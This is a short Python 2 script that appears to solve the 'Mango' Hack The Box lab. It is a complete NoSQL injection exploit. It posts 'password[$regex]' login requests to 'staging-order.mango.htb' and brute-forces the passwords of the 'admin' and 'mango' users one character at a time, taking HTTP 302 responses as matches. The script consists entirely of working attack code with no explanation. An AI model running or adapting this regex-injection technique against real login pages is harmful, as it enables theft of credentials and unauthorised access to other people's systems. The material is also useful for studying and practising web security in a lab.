from requests import post
from string import printable

url = 'http://staging-order.mango.htb/'
admin_pass = ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '\\$', '\\.', '>', '\\\\', '\\^', '\\|']
mango_pass = ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '\\$', '\\.', '\\\\', ']', '\\^', '{', '\\|', '~']

def sendPayload(user, word):
    valid = admin_pass if user == 'admin' else mango_pass
    for char in valid:
        regex = '^{}.*'.format(word + char)
        data = {'username': user, 'password[$regex]':regex, 'login':'login'}
        response = post (url, data = data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None

def getUser():
    for user in ['admin', 'mango']:
        password = ''
        while True:
            char = sendPayload(user, password)
            if char != None:
                password +=char
            else:
                print "Password for {} found: {}".format(user, password)
                break

if __name__ == '__main__':
    getUser()
